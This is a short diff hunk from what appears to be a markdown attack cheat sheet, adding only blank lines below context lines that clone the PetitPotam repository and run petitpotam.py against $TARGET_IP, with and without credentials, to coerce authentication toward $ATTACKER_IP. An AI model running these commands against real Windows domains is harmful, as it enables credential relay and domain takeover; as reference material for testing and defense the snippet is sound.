@@ -20,3 +20,5 @@ git clone https://github.com/topotam/PetitPotam
 python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
 python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
 ```
+
+
